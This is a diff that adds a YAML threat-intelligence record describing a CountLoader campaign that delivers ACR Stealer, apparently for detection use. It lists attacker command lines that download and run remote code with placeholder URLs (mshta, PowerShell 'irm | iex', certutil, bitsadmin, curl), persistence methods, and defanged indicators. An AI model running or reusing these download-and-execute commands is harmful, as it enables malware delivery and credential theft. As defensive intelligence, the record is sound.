@@ -1,0 +1,86 @@
+description: '''CountLoader Trojanized software lure used for initial access, followed
+  by ACR Stealer payload execution.'''
+attribution: Howler Cell Threat Intelligence Team
+malware_families:
+- CountLoader
+- ACR Stealer
+TTPs:
+  processes:
+  - mshta.exe
+  - powershell.exe
+  - rundll32.exe
+  - curl.exe
+  - bitsadmin.exe
+  - certutil.exe
+  - pythontest.exe
+  - msiexec.exe
+  commandline:
+  - mshta.exe <URL>
+  - cmd.exe /c start /b mshta.exe <URL>
+  - powershell.exe -Command "irm <url> | iex"
+  - rundll32 \"<UserProfile>\\module.dll, <ExportName>
+  - curl.exe -k -o "<out>" "<url>"
+  - bitsadmin.exe /transfer "<job>" /download /priority foreground "<url>" "<out>"
+  - certutil.exe -urlcache -split -f "<url>" "<out>"
+  - pythontest.exe \"<UserProfile>\\folder\\run.py\"
+  - msiexec.exe /i \"<UserProfile>\\package.msi\" /quiet /qn
+  powershell:
+  - powershell.exe -Command "irm <url> | iex"
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CrowdStrike Falcon
+  image_load: []
+  network_connections:
+  - mshta.exe <URL>
+  - globalsnn2-new[.]cc/WinX_DVD_Copy_Pro.zip
+  - hxxps[://]alphazero1-endscape[.]cc
+  - globalsnn3-new[.]cc
+  - globalsnn1-new[.]cc
+  - s1-rarlab[.]com
+  - my-smart-house1[.]com
+  - bucket-aws-s1[.]com
+  file_activity:
+  - Setup.exe
+  - <UserProfile>\\folder\\run.py
+  - <UserProfile>\\module.dll
+  - <UserProfile>\\package.msi
+  - WinX_DVD_Copy_Pro.zip
+  - WinX_DVD_Copy_Pro.exe
+  persistence:
+  - Scheduled Task with name "GoogleTaskSystem136.0.7023.12" + <GUID-like string>
+  - mshta.exe <URL>
+  - cmd.exe /c start \"\" .\\original_filename & start \"\" mshta \"<C2_parameter>\"
+  process_relations:
+  - Setup.exe -> mshta.exe
+  - mshta.exe -> powershell.exe
+IOCs:
+  hashes:
+  - eac4f6a197b4a738c2294419fda97958b45faee3475b70b6ce113348b73eab3b
+  - d261394ea0012f6eaddc21a2091db8a7d982d919f18d3ee6962dc4bb935d5759
+  ip_addresses:
+  - 45[.]154[.]58[.]190
+  - 172[.]67[.]173[.]229
+  - 31[.]59[.]139[.]111
+  - 104[.]21[.]91[.]144
+  - 94[.]183[.]183[.]52
+  - 104[.]21[.]9[.]208
+  domains:
+  - globalsnn2-new[.]cc
+  - ms-team-ping7[.]com
+  - globalsnn3-new[.]cc
+  - globalsnn1-new[.]cc
+  - s1-rarlab[.]com
+  - my-smart-house1[.]com
+  - bucket-aws-s1[.]com
+  - alphazero1-endscape[.]cc
+  - polystore9-servicebucket[.]cc
+  - microservice-update-s1-bucket[.]cc
+  urls:
+  - hxxps[://]globalsnn2-new[.]cc/WinX_DVD_Copy_Pro.zip
+authors:
+- Howler Cell Threat Intelligence Team
+CVEs: '[]'
+reference: https://www.cyderes.com/howler-cell/acr-stealer-rides-on-upgraded-countloader
+date_of_publication: December 19, 2025
+file_creation_date: December 19, 2025
